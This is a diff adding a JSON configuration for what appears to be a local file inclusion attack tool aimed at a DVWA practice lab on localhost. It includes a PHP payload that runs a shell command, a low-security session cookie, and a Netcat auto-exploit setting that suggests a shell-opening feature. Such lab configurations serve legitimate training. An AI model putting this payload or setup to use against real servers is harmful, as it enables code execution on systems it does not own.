@@ -1,0 +1,29 @@
+{
+    "Main": {
+        "TargetURL": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=",
+        "PHPInfoURL": "http://127.0.0.1/DVWA/phpinfo.php",
+        "PHPInputPayload": "<?php system('ls -l'); ?>",
+        "LFIPathList": "lfi_paths.txt"
+    },
+
+    "HTTP.Attributes": {
+        "Headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
+            "Upgrade-Insecure-Requests": "1",
+            "DNT": "1",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate"
+        },
+
+        "Cookies": {
+            "security": "low",
+            "PHPSESSID": "0chq0rkqp69aftbksh5ook3jft"
+        }
+    },
+
+    "Exploit.Attributes": {
+        "NetcatAutoExploit": false,
+        "NetcatHostIP": "127.0.0.1"
+    }
+}
